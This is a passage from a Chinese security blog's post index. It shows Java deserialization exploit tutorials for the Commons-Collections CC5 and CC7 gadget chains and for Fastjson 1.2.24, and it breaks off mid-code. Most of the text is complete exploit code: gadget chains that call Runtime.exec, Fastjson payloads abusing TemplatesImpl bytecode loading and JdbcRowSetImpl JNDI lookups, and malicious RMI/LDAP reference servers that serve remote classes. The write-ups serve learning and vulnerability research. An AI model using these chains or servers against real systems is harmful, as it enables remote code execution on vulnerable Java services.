TiedMapEntry tiedMapEntry = new TiedMapEntry(decorateMap, \"value\");  \n tiedMapEntry.toString();  \n &#125;  \n&#125;\n\n3. 结合入口类的完整 EXP 编写\n第一次自己写这个 EXP，花了我不少时间。\n\n这里运气比较好，入口类的 BadAttributeValueExpException 的作用域是 public，所以我们可以直接 new 一个对象。\nBadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);\n\nnew 完之后，我们需要修改 BadAttributeValueExpException 的 val 值，而 BadAttributeValueExpException 是支持序列化的，我们用反射的方式来修改。\nClass c = Class.forName(\"javax.management.BadAttributeValueExpException\");  \nField field = c.getDeclaredField(\"val\");  \nfield.setAccessible(true);  \nfield.set(badAttributeValueExpException, tiedMapEntry);\n\n成功弹出计算器，完整的 EXP 如下。\nimport org.apache.commons.collections.Transformer;  \nimport org.apache.commons.collections.functors.ChainedTransformer;  \nimport org.apache.commons.collections.functors.ConstantTransformer;  \nimport org.apache.commons.collections.functors.InvokerTransformer;  \nimport org.apache.commons.collections.keyvalue.TiedMapEntry;  \nimport org.apache.commons.collections.map.LazyMap;  \n  \nimport javax.management.BadAttributeValueExpException;  \nimport java.io.*;  \nimport java.lang.reflect.Field;  \nimport java.util.HashMap;  \nimport java.util.Map;  \n  \n// 结合入口类的完整 EXP 编写  \npublic class CC5EXP &#123;  \n    public static void main(String[] args) throws Exception&#123;  \n        Transformer[] transformers = new Transformer[]&#123;  \n                new ConstantTransformer(Runtime.class), // 构造 setValue 的可控参数  \n new InvokerTransformer(\"getMethod\",  \n new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;\"getRuntime\", null&#125;),  \n new InvokerTransformer(\"invoke\"  \n , new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),  \n new InvokerTransformer(\"exec\", new Class[]&#123;String.class&#125;, new Object[]&#123;\"calc\"&#125;)  \n        &#125;;  \n ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  \n HashMap&lt;Object, Object> hashMap = new HashMap&lt;>();  \n Map decorateMap = LazyMap.decorate(hashMap, chainedTransformer);  \n TiedMapEntry tiedMapEntry = new TiedMapEntry(decorateMap, \"value\");  \n  \n BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);  \n Class c = Class.forName(\"javax.management.BadAttributeValueExpException\");  \n Field field = c.getDeclaredField(\"val\");  \n field.setAccessible(true);  \n field.set(badAttributeValueExpException, tiedMapEntry);  \n serialize(badAttributeValueExpException);  \n unserialize(\"ser.bin\");  \n &#125;  \n    public static void serialize(Object obj) throws IOException &#123;  \n        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\"));  \n oos.writeObject(obj);  \n &#125;  \n    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException&#123;  \n        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));  \n Object obj = ois.readObject();  \n return obj;  \n &#125;  \n&#125;\n\n\n\n0x04 小结\n走个形式吧，感觉自己体会到的更多，后续可能会写一篇关于反序列化的总结文章。\n\n","categories":["Java"],"tags":["Java"]},{"title":"Java反序列化Commons-Collections篇08-CC7链","url":"/2022/06/29/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8708-CC7%E9%93%BE/","content":"CC7链\n\nJava 反序列化 Commons-Collections 最终篇 CC7 链0x01 前言CC7 的链子也是和 CC5 类似，后半条链子也是 LazyMap.get() 的这条链子。\n\n最后一篇了，建议师傅们多尝试自己手写 EXP\n\n0x02 CC7 链分析\nCC7 链用流程图表示如下\n\n\n\n后半条链和 CC1 是一样的，前半条链子需要我们自己重新写一遍。如果是逆向分析的话，还是有点难度的，所以还是直接看 yso 官方的链子。\n\n前半条链子的入口类是 Hashtable，我们跟进去看一下。\n\nHashtable 的入口类 readObject() 方法调用了一个 reconstitutionPut() 方法。\n\n\n继续 reconstitutionPut() 方法，跟进之后我们看到 reconstitutionPut() 方法调用了 equals() 方法，当然它也调用了 hashCode() 方法，如果是 hashCode() 这里走的话，又回到我们 CC6 的链子了，我们今天主看 CC7 的。\n\n\n接下来是 equals() 这个方法，因为要找的话实在是太多了，直接全局搜索，定位到 AbstractMapDecorator 这个类中。\n\n\n这个类是继承了 map 接口，因为它是 CC 包里面的 Map 类，并且能够调用父类 Map，所以把它作为链子的一部分。但是 Map 是一个接口，我们需要去找 Map 的实现类。\n\n最终在 AbstractMap 类中的 equals() 方法中发现其调用了 get() 方法。\n\n\n\n现在前半条链子分析完毕了，我们开始写 EXP\n0x03 CC7 EXP 编写1. LazyMap.get() EXP\n还是先复制一下后半段的链子，如下\n\nimport org.apache.commons.collections.Transformer;  \nimport org.apache.commons.collections.functors.ChainedTransformer;  \nimport org.apache.commons.collections.functors.ConstantTransformer;  \nimport org.apache.commons.collections.functors.InvokerTransformer;  \nimport org.apache.commons.collections.map.LazyMap;  \n  \nimport java.lang.reflect.Method;  \nimport java.util.HashMap;  \nimport java.util.Map;  \n  \n// LazyMap.get 后半条链子的 EXPpublic class LazyMapEXP &#123;  \n    public static void main(String[] args) throws Exception&#123;  \n        Transformer[] transformers = new Transformer[]&#123;  \n                new ConstantTransformer(Runtime.class), // 构造 setValue 的可控参数  \n new InvokerTransformer(\"getMethod\",  \n new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;\"getRuntime\", null&#125;),  \n new InvokerTransformer(\"invoke\"  \n , new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),  \n new InvokerTransformer(\"exec\", new Class[]&#123;String.class&#125;, new Object[]&#123;\"calc\"&#125;)  \n        &#125;;  \n ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  \n HashMap&lt;Object, Object> hashMap = new HashMap&lt;>();  \n Map decorateMap = LazyMap.decorate(hashMap, chainedTransformer);  \n  \n Class&lt;LazyMap> lazyMapClass = LazyMap.class;  \n Method lazyGetMethod = lazyMapClass.getDeclaredMethod(\"get\", Object.class);  \n lazyGetMethod.setAccessible(true);  \n lazyGetMethod.invoke(decorateMap, chainedTransformer);  \n &#125;  \n&#125;\n\n哦对提一嘴，后续运行的时候那段反射是要删掉的，写这段反射只是为了证明一下我们现在的 EXP 能够行得通。\n2. AbstractMap.equals() EXP这里的 AbstractMap 不能进行序列化，所以这一段的 EXP 我没有想到该怎么样编写比较合适，就直接看最后的 EXP 吧。\n3. 结合入口类编写 EXP\n\n这里对传进的 Entry 对象数组进行了循环，逐个调用e.key.equals(key)，这里传进去的参数key如果是我们可控的，那么AbstractMap.equals()中的m就是我们可控的。\n\n从本质上来说，我们需要在入口类这里传进去恶意的 key，接着调用 key.equals() 即可。\n\n这一段传入恶意 key 应当如此\nHashtable hashtable = new Hashtable();  \nhashtable.put(decorateMap, \"Drunkbaby\");\n\n现在我们直接进行序列化反序列化即可，EXP 如下。\nimport org.apache.commons.collections.Transformer;  \nimport org.apache.commons.collections.functors.ChainedTransformer;  \nimport org.apache.commons.collections.functors.ConstantTransformer;  \nimport org.apache.commons.collections.functors.InvokerTransformer;  \nimport org.apache.commons.collections.map.LazyMap;  \n  \nimport java.io.*;  \nimport java.lang.reflect.Field;  \nimport java.util.*;  \n  \n// AbstractMap 的 EXPpublic class AbstractMapEXP &#123;  \n    public static void main(String[] args) throws Exception &#123;  \n        Transformer[] transformers = new Transformer[]&#123;  \n                new ConstantTransformer(Runtime.class), // 构造 setValue 的可控参数  \n new InvokerTransformer(\"getMethod\",  \n new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;\"getRuntime\", null&#125;),  \n new InvokerTransformer(\"invoke\"  \n , new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),  \n new InvokerTransformer(\"exec\", new Class[]&#123;String.class&#125;, new Object[]&#123;\"calc\"&#125;)  \n        &#125;;  \n ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  \n HashMap&lt;Object, Object> hashMap = new HashMap&lt;>();  \n Map decorateMap = LazyMap.decorate(hashMap, chainedTransformer);  \n  \n Hashtable hashtable = new Hashtable();  \n hashtable.put(decorateMap, \"Drunkbaby\");  \n  \n serialize(hashtable);  \n unserialize(\"ser.bin\");  \n &#125;  \n        public static void serialize(Object obj) throws IOException &#123;  \n            ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\"));  \n oos.writeObject(obj);  \n &#125;  \n        public static Object unserialize(String Filename) throws IOException, ClassNotFoundException&#123;  \n            ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));  \n Object obj = ois.readObject();  \n return obj;  \n &#125;  \n&#125;\n\n\n但是运行却无法弹出计算器，这里尝试打断点调试一下。\n\n4. 调试与编写 EXP\n这里我把断点打在了 AbstractMap.equals() 的地方，结果发现居然没有执行到 .equals() 这个方法，去看一看 yso 的链子是怎么写的。\n\n\n\nyso 这里的链子比我们多了一个 map，而且将两个 map 进行了比较，一看到这个就明白了。\n\n为什么要调用两次 put()?\n\n我们需要调用的 e.key.equal() 方法是在 for 循环里面的，需要进入到这 for 循环才能调用。\nHashtable 的 reconstitutionPut() 方法是被遍历调用的，\n第一次调用的时候，并不会走入到 reconstitutionPut() 方法 for 循环里面，因为 tab[index] 的内容是空的，在下面会对 tab[index] 进行赋值。\n\n\n\n为什么调用的两次put()其中map中key的值分别为yy和zZ?\n\n第二次调用 reconstitutionPut() 进入到 for 循环的时候，此时 e 是从 tab 中取出的 lazyMap1 ，然后进入到判断中，要经过 (e.hash == hash) 判断为真才能走到我们想要的 e.key.equal() 方法中。这里判断要求取出来的 lazyMap1 对象的hash值要等都现在对象也就是 lazyMap2 的hash值，这里的hash值是通过 lazyMap 对象中的 key.hashCode() 得到的，也就是说 lazyMap1 的 hash 值就是 &quot;yy&quot;.hashCode() ，lazyMap2 的 hash 值就是  &quot;zZ&quot;.hashCode() ，而在 java 中有一个小 bug：\n\"yy\".hashCode() == \"zZ\".hashCode()\n\nyy 和 zZ 由 hashCode() 计算出来的值是一样的。正是这个小 bug 让这里能够利用，所以这里我们需要将 map 中 put() 的值设置为 yy 和 zZ，才能走到我们想要的 e.key.equal() 方法中。\n\n为什么在调用完 HashTable.put() 之后，还需要在 map2 中 remove() 掉 yy？\n\n这是因为 HashTable.put() 实际上也会调用到 equals() 方法：\n当调用完 equals() 方法后，LazyMap2 的 key 中就会增加一个 yy 键：\n\n\n这就不能满足 hash 碰撞了，构造序列化链的时候是满足的，但是构造完成之后就不满足了，那么经过对方服务器反序列化也不能满足 hash 碰撞了，也就不会执行系统命令了，所以就在构造完序列化链之后手动删除这多出来的一组键值对。\n现在我们的 EXP 是这样的。\nimport org.apache.commons.collections.Transformer;  \nimport org.apache.commons.collections.functors.ChainedTransformer;  \nimport org.apache.commons.collections.functors.ConstantTransformer;  \nimport org.apache.commons.collections.functors.InvokerTransformer;  \nimport org.apache.commons.collections.map.LazyMap;  \n  \nimport java.io.*;  \nimport java.lang.reflect.Field;  \nimport java.util.*;  \n  \n// AbstractMap 的 EXPpublic class AbstractMapEXP &#123;  \n    public static void main(String[] args) throws Exception &#123;  \n        Transformer[] transformers = new Transformer[]&#123;  \n                new ConstantTransformer(Runtime.class), // 构造 setValue 的可控参数  \n new InvokerTransformer(\"getMethod\",  \n new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;\"getRuntime\", null&#125;),  \n new InvokerTransformer(\"invoke\"  \n , new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),  \n new InvokerTransformer(\"exec\", new Class[]&#123;String.class&#125;, new Object[]&#123;\"calc\"&#125;)  \n        &#125;;  \n ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  \n HashMap&lt;Object, Object> hashMap1 = new HashMap&lt;>();  \n HashMap&lt;Object, Object> hashMap2 = new HashMap&lt;>();  \n Map decorateMap1 = LazyMap.decorate(hashMap1, chainedTransformer);  \n decorateMap1.put(\"yy\", 1);  \n Map decorateMap2 = LazyMap.decorate(hashMap2, chainedTransformer);  \n decorateMap2.put(\"zZ\", 1);  \n Hashtable hashtable = new Hashtable();  \n hashtable.put(decorateMap1, 1);  \n hashtable.put(decorateMap2, 1);  \n decorateMap2.remove(\"yy\");  \n  \n serialize(hashtable);  \n unserialize(\"ser.bin\");  \n &#125;  \n        public static void serialize(Object obj) throws IOException &#123;  \n            ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\"));  \n oos.writeObject(obj);  \n &#125;  \n        public static Object unserialize(String Filename) throws IOException, ClassNotFoundException&#123;  \n            ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));  \n Object obj = ois.readObject();  \n return obj;  \n &#125;  \n&#125;\n\n现在执行的话会跳出两个计算器，在序列化的时候会跳出一个，所以我们要先将序列化的这个过程赋为常数，让其反序列化的时候弹出计算器。\n最终 EXP\nimport org.apache.commons.collections.Transformer;  \nimport org.apache.commons.collections.functors.ChainedTransformer;  \nimport org.apache.commons.collections.functors.ConstantTransformer;  \nimport org.apache.commons.collections.functors.InvokerTransformer;  \nimport org.apache.commons.collections.map.LazyMap;  \n  \nimport java.io.*;  \nimport java.lang.reflect.Field;  \nimport java.util.*;  \n  \n// AbstractMap 的 EXPpublic class AbstractMapEXP &#123;  \n    public static void main(String[] args) throws Exception &#123;  \n        Transformer[] transformers = new Transformer[]&#123;  \n                new ConstantTransformer(Runtime.class), // 构造 setValue 的可控参数  \n new InvokerTransformer(\"getMethod\",  \n new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;\"getRuntime\", null&#125;),  \n new InvokerTransformer(\"invoke\"  \n , new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),  \n new InvokerTransformer(\"exec\", new Class[]&#123;String.class&#125;, new Object[]&#123;\"calc\"&#125;)  \n        &#125;;  \n ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]&#123;&#125;);  \n HashMap&lt;Object, Object> hashMap1 = new HashMap&lt;>();  \n HashMap&lt;Object, Object> hashMap2 = new HashMap&lt;>();  \n Map decorateMap1 = LazyMap.decorate(hashMap1, chainedTransformer);  \n decorateMap1.put(\"yy\", 1);  \n Map decorateMap2 = LazyMap.decorate(hashMap2, chainedTransformer);  \n decorateMap2.put(\"zZ\", 1);  \n Hashtable hashtable = new Hashtable();  \n hashtable.put(decorateMap1, 1);  \n hashtable.put(decorateMap2, 1);  \n Class c = ChainedTransformer.class;  \n Field field = c.getDeclaredField(\"iTransformers\");  \n field.setAccessible(true);  \n field.set(chainedTransformer, transformers);  \n decorateMap2.remove(\"yy\");  \n  \n serialize(hashtable);  \n unserialize(\"ser.bin\");  \n &#125;  \n        public static void serialize(Object obj) throws IOException &#123;  \n            ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\"));  \n oos.writeObject(obj);  \n &#125;  \n        public static Object unserialize(String Filename) throws IOException, ClassNotFoundException&#123;  \n            ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));  \n Object obj = ois.readObject();  \n return obj;  \n &#125;  \n&#125;\n\n\n\n0x04 小结还是要懂开发，不然挺难的。\n像 equal 这个方法，如果不知道是怎么一回事挺难利用，冲冲冲\n","categories":["Java"],"tags":["Java"]},{"title":"Java反序列化Fastjson篇02-Fastjson-1.2.24版本漏洞分析","url":"/2022/08/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8702-Fastjson-1-2-24%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","content":"Fastjson 1.2.24版本漏洞分析\n\nJava 反序列化 Fastjson篇 02-Fastjson 1.2.24 版本漏洞分析0x01 前言这篇作为自己学习 Fastjson 系列的敲门砖吧，虽然之前也通过 CTF 了解过一点了，但是那个太浅了，今天系统地学习一下。\n先从 Fastjsono 1.2.24 的版本漏洞开始\n0x02 环境\njdk8u65，最好是低一点的版本，因为有一条 Jndi 的链子；虽然说也是可以绕过，我们这里还是一步步来比较好。\nMaven 3.6.3\n1.2.22 &lt;&#x3D; Fastjson &lt;&#x3D; 1.2.24\n\npom.xml 导入如下所示\n&lt;dependency>\n    &lt;groupId>com.unboundid&lt;/groupId>\n    &lt;artifactId>unboundid-ldapsdk&lt;/artifactId>\n    &lt;version>4.0.9&lt;/version>\n&lt;/dependency>\n&lt;dependency>\n    &lt;groupId>commons-io&lt;/groupId>\n    &lt;artifactId>commons-io&lt;/artifactId>\n    &lt;version>2.5&lt;/version>\n&lt;/dependency>\n&lt;dependency>\n    &lt;groupId>com.alibaba&lt;/groupId>\n    &lt;artifactId>fastjson&lt;/artifactId>\n    &lt;version>1.2.24&lt;/version>\n&lt;/dependency>\n&lt;dependency>\n    &lt;groupId>commons-codec&lt;/groupId>\n    &lt;artifactId>commons-codec&lt;/artifactId>\n    &lt;version>1.12&lt;/version>\n&lt;/dependency>\n\n\n主要有两条攻击的链子，一条是基于 TemplatesImpl 的链子，另一条是基于 JdbcRowSetImpl 的链子。\n\n这里我废话就不多说了，直接进入主题。\n0x03 基于 TemplatesImpl 的利用链\n大致的思路，在上一篇里面说的可能不太清晰，我这里再总结一下。\n\n我们的 PoC 是把恶意代码放到一个 json 格式的字符串里面，开头是要接 @type 的。这里其实赋值就代表我们不需要通过反射来修改值，而是可以直接赋值。\n@type 之后是我们要去进行反序列化的类，会获取它的构造函数、getter 与 setter 方法。\n所以我们首先是要找这个反序列化类的构造函数、 getter，setter 方法有问题的地方，\n\n说了一些总结性的话，现在我们从漏洞发现的角度去看一遍。\n\n\n1. 链子分析选取能够命令执行的类这里，我们要回想起之前在学习 CC 链的时候有一条链子 CC3 链开辟了 TemplatesImpl 加载字节码的先河，而它的漏洞点在于调用了 .newInstance() 方法。我们现在回去看这里，发现漏洞点的地方实际上是一个 getter 方法，如图。\n\n\n所以 TemplatesImpl 是满足我们 fastjson 漏洞的利用条件的，在构造 EXP 之前，先分析一下 EXP 里面的一些参数。\n分析 TemplatesImpl 里面的参数个人觉得这一步和当时学习 CC3 链子的时候非常像。之前是通过反射修改，这里直接放到 json 字符串里面就可以。\n\n先看 TemplatesImpl 类中的 getTransletInstance() 方法。这里可以直接参考 CC3\t 链子的构造。\n\n\n\n_name 不可以为 null，需要 _class 为 null，这样进入到 defineTransletClasses 这个方法里面。所以 _class 可以不用写，或者写为 null。_tfactory 也不能为 null，具体可以见这篇 CC3 的分析文章，如果 CC 链都掌握的话，用这条 TemplatesImpl 链加载字节码是很容易理解的。\n_bytecodes 是恶意字节码。恶意字节码的类需要\n所以我们现在的 payload 大概是这样的\nfinal String NASTY_CLASS = \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\";\n\nfinal String evilClassPath = \"E:\\\\JavaClass\\\\TemplatesBytes.class\";\n\n\"\n\n&#123;\n\t\n \\\"@type\\\":\\\"\" + NASTY_CLASS + \"\\\",\n \\\"_bytecodes\\\":[\\\"\"+evilCode+\"\\\"],\n '_name':'Drunkbaby',\n '_tfactory':&#123; &#125;,\n\n\";\n\n\n一开始我以为这样子就可以了，因为 fastjson 在反序列化的时候会自动去找所有的 getter 方法的，结果没弹出计算器来，后面知道原来还和 _outputProperties 这个变量有关系。\n因为 fastjson 这个 sette 和 getteer 方法并不是所有都是调用的，是有条件的。\n下面直接引用结论，Fastjson会对满足下列要求的setter&#x2F;getter方法进行调用：\n满足条件的setter：\n\n非静态函数\n返回类型为void或当前类\n参数个数为1个\n\n满足条件的getter：\n\n非静态方法\n无参数\n返回值类型继承自Collection或Map或AtomicBoolean或AtomicInteger或AtomicLong\n\n这里我们想去调用的 getTransletInstance() 这个方法不满足上述的返回值，它返回的是一个抽象类。\n解决无法调用 getTransletInstance() 方法的问题\n这里用到的也是链子的思维，我们去找谁调用了 getTransletInstance()，右键 find usages\n\n\n\n看着是 newTransformer() 方法调用了 getTransletInstance() 方法，但是无法了利用，因为它不是 setter&#x2F;getter 方法，继续找。\n\n\n此处我们找到一个 getOutputProperties() 调用了 newTransformer()。大致的链子是这样\ngetOutputProperties()  ---> newTransformer() ---> TransformerImpl(getTransletInstance(), _outputProperties,  \n _indentNumber, _tfactory);\n\n然后我们看 getOutputProperties() 是否满足 getter 方法里面的返回值，一看是满足的，因为返回值是 Properties 即继承自 Map 类型。\n所以我们现在的 payload 里面需要去管 getOutputProperties() 的 outputProperties 变量的值，先把它赋值为空试一试。\n所以我们的 payload 大概是这样的\nfinal String NASTY_CLASS = \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\";\n\nfinal String evilClassPath = \"E:\\\\JavaClass\\\\TemplatesBytes.class\";\n\n\"\n\n&#123;\n\t\n \\\"@type\\\":\\\"\" + NASTY_CLASS + \"\\\",\n \\\"_bytecodes\\\":[\\\"\"+evilCode+\"\\\"],\n '_name':'Drunkbaby',\n '_tfactory':&#123; &#125;,\n \\\"_outputProperties\\\":&#123; &#125;,\n\n\";\n\n2. EXP 构造payload 既然已经写好，直接 EXP 上！\n这里我们在反序列化的时候的参数需要加上 Object.class 与 Feature.SupportNonPublicField，因为 getOutputProperties() 方法是私有的，而且正常我们写 EXP 没必要不带这个参数。。。。\nimport com.alibaba.fastjson.JSON;  \nimport com.alibaba.fastjson.parser.Feature;  \nimport com.alibaba.fastjson.parser.ParserConfig;  \nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  \nimport org.apache.commons.codec.binary.Base64;  \nimport org.apache.commons.io.IOUtils;  \n  \nimport java.io.ByteArrayOutputStream;  \nimport java.io.File;  \nimport java.io.FileInputStream;  \nimport java.io.IOException;  \n  \n// TemplatesImpl 链子的 EXPpublic class TemplatesImplPoc &#123;  \n    public static String readClass(String cls)&#123;  \n        ByteArrayOutputStream bos = new ByteArrayOutputStream();  \n try &#123;  \n            IOUtils.copy(new FileInputStream(new File(cls)), bos);  \n &#125; catch (IOException e) &#123;  \n            e.printStackTrace();  \n &#125;  \n        return Base64.encodeBase64String(bos.toByteArray());  \n &#125;  \n  \n    public static void main(String args[])&#123;  \n        try &#123;  \n            ParserConfig config = new ParserConfig();  \n final String fileSeparator = System.getProperty(\"file.separator\");  \n final String evilClassPath = \"E:\\\\JavaClass\\\\TemplatesBytes.class\";  \n String evilCode = readClass(evilClassPath);  \n final String NASTY_CLASS = \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\";  \n String text1 = \"&#123;\\\"@type\\\":\\\"\" + NASTY_CLASS +  \n                    \"\\\",\\\"_bytecodes\\\":[\\\"\"+evilCode+\"\\\"],'_name':'Drunkbaby','_tfactory':&#123; &#125;,\\\"_outputProperties\\\":&#123; &#125;,\";  \n System.out.println(text1);  \n  \n Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);  \n //Object obj = JSON.parse(text1, Feature.SupportNonPublicField);  \n &#125; catch (Exception e) &#123;  \n            e.printStackTrace();  \n &#125;  \n    &#125;  \n&#125;\n\n\n成功弹出计算器\n\n\n\n0x04 基于 JdbcRowSetImpl 的利用链\n简单来说就是 JNDI 注入的形式，也就是我们平常用的最多的攻击手段。\n\n基于 JdbcRowSetImpl 的利用链主要有两种利用方式，即 JNDI + RMI 和 JNDI + LDAP，都是属于基于 Bean Property 类型的 JNDI 的利用方式。\n如果平常有打过 CTF 里面 fastjson 的题目的话，基本利用都是这个方式，因为动态加载字节码更加灵活。\n\n下面我们还是以漏洞发现者的角度看一下\n\n1. JNDI + RMI这一条链子名为 JdbcRowSetImpl，所以我们先进到这个类里面进去。结果我翻了很久都没有看到能够命令执行利用的 getter 与 setter 方法，其实后续看 EXP 的时候师傅们可以看出来，这是 JNDI 的 Reference 的攻击方式。\nJdbcRowSetImpl 类里面有一个 setDataSourceName() 方法，一看方法名就知道是什么意思了。设置数据库源，我们通过这个方式攻击。\nEXP 如下\n&#123;\n\t\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\n\t\"dataSourceName\":\"rmi://localhost:1099/Exploit\", \"autoCommit\":true\n&#125;\n\n\n根据 JNDI 注入的漏洞利用，需要先起一个 Server，然后把恶意的类放到 vps 上即可。可以把之前的 Server 复制进来。\nJNDIRmiServer.java把 localhost 换成自己的 vps 即可。\nimport javax.naming.InitialContext;  \nimport javax.naming.Reference;  \nimport java.rmi.registry.LocateRegistry;  \nimport java.rmi.registry.Registry;  \n  \npublic class JNDIRMIServer &#123;  \n    public static void main(String[] args) throws Exception&#123;  \n        InitialContext initialContext = new InitialContext();  \n Registry registry = LocateRegistry.createRegistry(1099);  \n // RMI  \n //initialContext.rebind(\"rmi://localhost:1099/remoteObj\", new RemoteObjImpl()); // JNDI 注入漏洞  \n Reference reference = new Reference(\"JndiCalc\",\"JndiCalc\",\"http://localhost:7777/\");  \n initialContext.rebind(\"rmi://localhost:1099/remoteObj\", reference);  \n &#125;  \n&#125;\n\n攻击的 EXP 如下\nimport com.alibaba.fastjson.JSON;  \n  \n// 基于 JdbcRowSetImpl 的利用链  \npublic class JdbcRowSetImplExp &#123;  \n    public static void main(String[] args) &#123;  \n        String payload = \"&#123;\\\"@type\\\":\\\"com.sun.rowset.JdbcRowSetImpl\\\",\\\"dataSourceName\\\":\\\"rmi://localhost:1099/remoteObj\\\", \\\"autoCommit\\\":true&#125;\";  \n JSON.parse(payload);  \n &#125;  \n&#125;\n\n成功\n\n\n2. JNDI + LDAP\n原理一致，直接上 Server 和 EXP 了\n\nJNDILdapServer.java\nimport com.unboundid.ldap.listener.InMemoryDirectoryServer;  \nimport com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;  \nimport com.unboundid.ldap.listener.InMemoryListenerConfig;  \nimport com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;  \nimport com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;  \nimport com.unboundid.ldap.sdk.Entry;  \nimport com.unboundid.ldap.sdk.LDAPException;  \nimport com.unboundid.ldap.sdk.LDAPResult;  \nimport com.unboundid.ldap.sdk.ResultCode;  \nimport javax.net.ServerSocketFactory;  \nimport javax.net.SocketFactory;  \nimport javax.net.ssl.SSLSocketFactory;  \nimport java.net.InetAddress;  \nimport java.net.MalformedURLException;  \nimport java.net.URL;  \n  \n  \n// jndi 绕过 jdk8u191 之前的攻击  \npublic class JNDILdapServer &#123;  \n    private static final String LDAP_BASE = \"dc=example,dc=com\";  \n public static void main (String[] args) &#123;  \n        String url = \"http://127.0.0.1:7777/#JndiCalc\";  \n int port = 1099;  \n try &#123;  \n            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);  \n config.setListenerConfigs(new InMemoryListenerConfig(  \n                    \"listen\",  \n InetAddress.getByName(\"0.0.0.0\"),  \n port,  \n ServerSocketFactory.getDefault(),  \n SocketFactory.getDefault(),  \n (SSLSocketFactory) SSLSocketFactory.getDefault()));  \n  \n config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url)));  \n InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);  \n System.out.println(\"Listening on 0.0.0.0:\" + port);  \n ds.startListening();  \n &#125;  \n        catch ( Exception e ) &#123;  \n            e.printStackTrace();  \n &#125;  \n    &#125;  \n    private static class OperationInterceptor extends InMemoryOperationInterceptor &#123;  \n        private URL codebase;  \n /**  \n * */ public OperationInterceptor ( URL cb ) &#123;  \n            this.codebase = cb;  \n &#125;  \n        /**  \n * &#123;@inheritDoc&#125;  \n * * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)  \n */ @Override  \n public void processSearchResult ( InMemoryInterceptedSearchResult result ) &#123;  \n            String base = result.getRequest().getBaseDN();  \n Entry e = new Entry(base);  \n try &#123;  \n                sendResult(result, base, e);  \n &#125;  \n            catch ( Exception e1 ) &#123;  \n                e1.printStackTrace();  \n &#125;  \n        &#125;  \n        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException &#123;  \n            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(\".class\"));  \n System.out.println(\"Send LDAP reference result for \" + base + \" redirecting to \" + turl);  \n e.addAttribute(\"javaClassName\", \"Exploit\");  \n String cbstring = this.codebase.toString();  \n int refPos = cbstring.indexOf('#');  \n if ( refPos > 0 ) &#123;  \n                cbstring = cbstring.substring(0, refPos);  \n &#125;  \n            e.addAttribute(\"javaCodeBase\", cbstring);  \n e.addAttribute(\"objectClass\", \"javaNamingReference\");  \n e.addAttribute(\"javaFactory\", this.codebase.getRef());  \n result.sendSearchEntry(e);  \n result.setResult(new LDAPResult(0, ResultCode.SUCCESS));  \n &#125;  \n  \n    &#125;  \n&#125;\n\n然后 EXP 的\nimport com.alibaba.fastjson.JSON;  \n  \npublic class JdbcRowSetImplLdapExp &#123;  \n    public static void main(String[] args) &#123;  \n        String payload = \"&#123;\\\"@type\\\":\\\"com.sun.rowset.JdbcRowSetImpl\\\",\\\"dataSourceName\\\":\\\"ldap://localhost:1099/Exploit\\\", \\\"autoCommit\\\":true&#125;\";  \n JSON.parse(payload);  \n &#125;  \n&#125;\n\n成功\n\n\n0x05 Fastjson 攻击中 jdk 高版本的绕过这里是针对基于 JdbcRowSetImpl 的利用链的 jdk 高版本绕过，绕过手段和之前是一样的，直接放 EXP 了。\nJNDIBypassHighJavaServerEL.java\nimport com.sun.jndi.rmi.registry.ReferenceWrapper;  \nimport org.apache.naming.ResourceRef;  \n  \nimport javax.naming.StringRefAddr;  \nimport java.rmi.registry.LocateRegistry;  \nimport java.rmi.registry.Registry;  \n  \n// JNDI 高版本 jdk 绕过服务端，用 bind 的方式  \npublic class JNDIBypassHighJavaServerEL &#123;  \n    public static void main(String[] args) throws Exception &#123;  \n        System.out.println(\"[*]Evil RMI Server 